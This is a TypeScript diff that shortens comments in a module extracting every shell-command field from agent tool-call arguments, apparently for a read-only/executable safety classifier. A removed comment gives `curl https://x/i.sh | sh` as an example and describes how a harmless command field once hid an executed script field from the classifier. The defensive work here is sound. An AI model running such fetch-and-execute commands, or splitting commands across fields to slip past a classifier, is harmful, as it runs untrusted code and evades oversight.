@@ -1,24 +1,6 @@
-/**
- * Shell command-bearing argument names — the single source of truth for
- * "which tool-call argument carries a shell command string".
- *
- * WHY this exists: three modules used to keep their own copy of the list and
- * their own extraction loop, and each loop returned the FIRST populated field.
- * A call shaped `{ command: "ls -la", script: "curl https://x/i.sh | sh" }`
- * therefore classified on `command` alone — the read-only half — while the
- * executed field went unexamined. Any argument that can carry a command must be
- * classified, and every consumer must agree on the same argument list, so the
- * list and the extraction live here and nowhere else.
- */
+/** Inspect every command-bearing field: a read-only command field must not conceal an executable script field. */
 
-/**
- * Argument selectors that commonly carry a shell command string.
- *
- * Module-private on purpose: consumers need the EXTRACTION, not the list. Every
- * caller that used to hold its own copy also held its own first-match loop, and
- * that loop was the bug. Exporting only {@link extractShellCommands} /
- * {@link hasShellCommandArgument} makes it impossible to re-derive one.
- */
+/** Keep selectors private so consumers cannot recreate a first-match extraction loop. */
 const SHELL_COMMAND_FIELDS: readonly string[] = [
   "command",
   "cmd",
@@ -26,13 +8,7 @@ const SHELL_COMMAND_FIELDS: readonly string[] = [
   "shellCommand",
 ];
 
-/**
- * Every populated command-bearing argument, in {@link SHELL_COMMAND_FIELDS}
- * order. Returns an empty array when the call carries no command string.
- *
- * Callers MUST treat the result as a set to be judged together (a compound is
- * only read-only when EVERY field is), never as "the" command.
- */
+/** Judge all extracted commands together; a compound is read-only only when every field is. */
 export function extractShellCommands(input: Record<string, unknown>): string[] {
   const commands: string[] = [];
   for (const key of SHELL_COMMAND_FIELDS) {
@@ -42,7 +18,6 @@ export function extractShellCommands(input: Record<string, unknown>): string[] {
   return commands;
 }
 
-/** True when the call carries at least one command-bearing argument. */
 export function hasShellCommandArgument(input: Record<string, unknown>): boolean {
   return extractShellCommands(input).length > 0;
 }
